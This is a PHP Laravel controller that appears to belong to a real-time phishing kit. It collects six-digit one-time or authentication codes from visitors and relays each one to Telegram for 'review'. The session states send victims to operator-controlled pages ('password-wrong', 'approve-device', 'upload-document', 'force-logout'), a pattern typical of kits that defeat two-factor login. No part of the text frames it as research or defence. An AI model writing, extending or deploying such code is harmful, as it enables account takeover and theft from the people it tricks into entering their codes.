<?php

namespace App\Http\Controllers;

use App\Models\AccessSession;
use App\Services\TelegramService;
use App\Support\AccessSessionResolver;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\View\View;

class OtpController extends Controller
{
    public function show(Request $request): View|RedirectResponse
    {
        $session = AccessSessionResolver::current($request);

        if (! AccessSessionResolver::isActive($session)) {
            return redirect()->route('force-logout');
        }

        if ($redirect = $this->leaveIfNeeded($session)) {
            return $redirect;
        }

        if (! $session->isOtpFlow()) {
            return redirect()->route('waiting');
        }

        $session->touchSeen();

        return view('otp', [
            'session' => $session,
            'review' => $session->isReview(),
            'isAuth' => $session->otp_type === AccessSession::TYPE_AUTH,
        ]);
    }

    public function store(Request $request, TelegramService $telegram): RedirectResponse
    {
        $session = AccessSessionResolver::current($request);

        if (! AccessSessionResolver::isActive($session)) {
            return redirect()->route('force-logout');
        }

        if (! in_array($session->status, [
            AccessSession::STATUS_OTP,
            AccessSession::STATUS_AUTH,
        ], true)) {
            return redirect()->route('otp');
        }

        $data = $request->validate([
            'otp' => ['required', 'digits:6'],
        ]);

        $session->submitOtp($data['otp']);
        $label = $session->otp_type === AccessSession::TYPE_AUTH ? 'AUTH Code' : 'OTP Code';
        $telegram->notifyReview($session->fresh(), $label, $data['otp']);

        return redirect()->route('otp');
    }

    protected function leaveIfNeeded(AccessSession $session): ?RedirectResponse
    {
        return match ($session->status) {
            AccessSession::STATUS_WAITING => redirect()->route('waiting'),
            AccessSession::STATUS_PASSWORD, AccessSession::STATUS_PASSWORD_REVIEW => redirect()->route('password-wrong'),
            AccessSession::STATUS_DEVICE, AccessSession::STATUS_DEVICE_REVIEW => redirect()->route('approve-device'),
            AccessSession::STATUS_DOCUMENT => redirect()->route('upload-document'),
            AccessSession::STATUS_LOGOUT, AccessSession::STATUS_CLOSED => redirect()->route('force-logout'),
            default => null,
        };
    }
}
